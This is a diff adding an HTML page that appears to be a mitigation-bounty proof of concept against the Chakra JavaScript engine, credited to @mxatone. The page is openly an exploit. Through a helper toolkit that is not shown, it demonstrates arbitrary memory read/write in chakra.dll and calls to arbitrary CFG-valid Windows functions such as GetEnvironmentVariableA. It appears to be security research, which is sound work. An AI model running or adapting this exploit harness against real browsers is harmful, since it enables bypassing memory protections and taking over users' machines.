@@ -1,0 +1,62 @@
+<html>
+<head>
+<title>Mitigation bounty PoC by @mxatone (Thomas Garnier)</title>
+<link rel="stylesheet" type="text/css" href="theme.css">
+<!-- Generic toolkit that can be used on multiple PoCs -->
+<script type="text/javascript" src="toolkit.js"></script>
+<script type="text/javascript">
+// Poc1 - Show that we can read-write anywhere
+function poc_1() {
+	var exp = null;
+	try {
+		exp = exploit_start("poc1 - readwrite anywhere");
+		
+		// We already have a pointer in chakra.dll
+		var chakra_base = exp.find_module_base(exp.vtable);
+		log("Chakra base is " + chakra_base.Stringify(16));
+		
+		var data = exp.read(chakra_base, 12);
+		log("Module starts with " + data);
+	} catch(err) {
+		log("JS EXCEPTION: "+err.stack);
+	} finally {
+		if (exp != null)
+			exp.cleanup();
+	}
+}
+
+// Poc2 - Show that we can call any valid CFG function
+function poc_2() {
+	var exp = null;
+	try {
+		exp = exploit_start("poc2 - call any valid CFG function");
+		
+		log("Calling GetEnvironmentVariableA to get $TMP");
+		
+		var env_mem = exp.allocate(0x1000);
+		var name = "TMP";
+		var r = exp.call_function("kernel32.dll", "GetEnvironmentVariableA", exp.dup_string(name), env_mem, 0xFFF);
+		check_ne(r, 0);
+		var value = exp.read_ascii(env_mem);
+		
+		log("TMP="+value);
+	} catch(err) {
+		log("JS EXCEPTION: "+err.stack);
+	} finally {
+		if (exp != null)
+			exp.cleanup();
+	}
+}
+</script>
+</head>
+<body>
+<h1>Mitigation bounty PoC - Basic examples by @mxatone (Thomas Garnier)</h1>
+<div class="container">
+  <div class="buttonbar">
+    <input type="button" onclick="poc_1()" value="PoC 1 - read-write anywhere" />
+	<input type="button" onclick="poc_2()" value="PoC 2 - call valid CFG function" />
+  </div>
+  <textarea id="log" class="text" wrap="off" placeholder="Log output will be here"></textarea>
+</div>
+</body>
+</html>
